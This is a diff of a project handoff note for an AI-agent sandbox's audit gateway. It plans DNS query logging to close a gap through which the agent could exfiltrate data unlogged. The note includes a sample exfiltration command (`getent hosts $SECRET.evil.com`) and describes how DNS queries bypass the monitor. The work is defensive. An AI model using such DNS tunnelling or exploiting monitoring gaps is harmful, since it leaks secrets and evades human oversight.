@@ -9,7 +9,73 @@
 - **Current Stage**: CONSTRUCTION — completion plan, **Batch 2 done and
   live-verified (2026-11-17, host smoke 30/30); Batch 3 (DNS logging) next**
 
-## ▶ RESUME POINT — Batch 2 live-verified; start Batch 3
+## ▶ RESUME POINT (next session) — start Batch 3 (DNS logging)
+
+**State (2026-11-17):** Batch 2 is committed and live-verified (host smoke
+`tests/smoke/audit-batch2.sh` 30/30). The completion plan is approved, so
+Batch 3 needs no new approval gate. Keep this file and `audit.md` current.
+Decided 2026-11-17 (KVM/AgentSight question, see `audit.md`): Batch 3 stays.
+AgentSight only observes, so it can't replace an enforced DNS path
+(`docs/internal/agentsight-feasibility.md` §5).
+
+**Batch 3 brief:**
+- **The hole.** The agent resolves through Docker's embedded resolver at
+  127.0.0.11. Docker's nat `OUTPUT -d 127.0.0.11 -j DOCKER_OUTPUT` DNATs
+  udp/tcp :53 to dockerd's listener inside the netns, and dockerd does the
+  upstream lookup from the host side. The gateway exempts loopback, so a query
+  never reaches mitmproxy: `getent hosts $SECRET.evil.com` exfiltrates
+  unlogged (the same class as the Docker Sandboxes DNS CVE in the thesis SOTA
+  scan). On top of that, Batch 2's filter ACCEPTs udp/53 to *any* resolver
+  (`dig @1.1.1.1 …`), and tcp/53 to 127.0.0.11 is exempt as loopback.
+- **Planned fix (verify every mitmproxy detail against the 11.1.3 docs/source
+  in the image before relying on it):**
+  1. mitmdump gets a second listener in DNS mode (e.g. `--mode dns@5353` next
+     to `--mode transparent`; check multi-mode syntax and which upstream
+     resolver dns mode uses. mitmdump runs as uid 0 and is exempt, so it can use
+     127.0.0.11 itself).
+  2. nat: **insert** (`-I OUTPUT 1`, ahead of Docker's `DOCKER_OUTPUT` jump) a
+     redirect of non-uid-0 udp **and** tcp dport 53, *any* destination, to that
+     listener. Mind the order relative to `TRIGON_AUDIT` (whose `-o lo` RETURN
+     would otherwise let tcp/53 to 127.0.0.11 bypass it).
+  3. filter: drop the Batch 2 `-p udp --dport 53 -j ACCEPT`. Redirected DNS
+     arrives via lo, so every other udp/53 falls through to the UDP REJECT.
+     That also settles the open "embedded resolver only?" question.
+  4. Addon: log each query via the `dns_request` / `dns_response` /
+     `dns_error` hooks as a `type: "dns"` record (qname, qtype, rcode, answer
+     IPs; schema-additive, chained like the rest). Design §5.1.
+     `audit_summary.py`: count DNS queries apart from connections and list
+     unique names. Mind that query names can carry data (that's the point of
+     logging them).
+  5. Healthcheck: also confirm the DNS listener answers, so the agent never
+     starts with DNS unaudited (fail closed, NFR-5).
+  6. Wording: `--help`, README, design §1/§3.1/§8 drop "DNS not logged yet".
+- **`--air-gap` check (ASK THE USER BEFORE CHANGING ANYTHING):** on an
+  `internal: true` network, does the embedded resolver still forward external
+  names (a DNS leak from `--air-gap` without `--audit`)? Newer Docker versions
+  reportedly stop forwarding on internal networks. Verify on the host's
+  version in the smoke script (an external name resolving under `--air-gap`
+  means a leak). Any fix to plain `--air-gap` needs the user's go-ahead.
+- **Rebuild?** Probably not: dns mode is part of mitmproxy; `entrypoint.sh`
+  and the addon are bind-mounted. Only a `compose/audit/Dockerfile` change
+  needs `./build.sh --audit-gateway`.
+- **Verification:** as in Batch 2. Unit tests for the record + summary;
+  bats for the new rules (the fake-iptables entrypoint run in `audit.bats`) and
+  the healthcheck; `tests/smoke/audit-batch3.sh` modelled on
+  `audit-batch2.sh` (probe.py run by the agent): a unique random qname via the
+  embedded resolver is in the log; `dig @1.1.1.1`-style raw UDP and a TCP DNS
+  query are redirected and logged (or refused); DNS and Claude Code still
+  work; the chain verifies; plus the `--air-gap` leak check above. Test the
+  stubbed paths against a fake docker first. Re-run `audit-batch2.sh` as a
+  regression: its "DNS lookup works (still allowed…)" wording will need an
+  update.
+- **Known environment facts:** host repo `~/projects/Trigon`; smoke login in
+  `~/.trigon-settings-smoke`; in the dev container bats is cloned into the
+  scratchpad and shellcheck comes from the `shellcheck-py` wheel (pip
+  download + unzip); there is no Docker or `/dev/kvm`. The dev image has no
+  dig/nc/ping, so probes are plain Python sockets (`audit-batch2.sh` shows
+  how).
+
+### Batch 2 result (2026-11-17)
 
 **Host smoke run 2026-11-17: `tests/smoke/audit-batch2.sh` 30/30 PASS.** No
 rebuild was needed (the image has `ip6tables`). Verified live: nat REDIRECT of
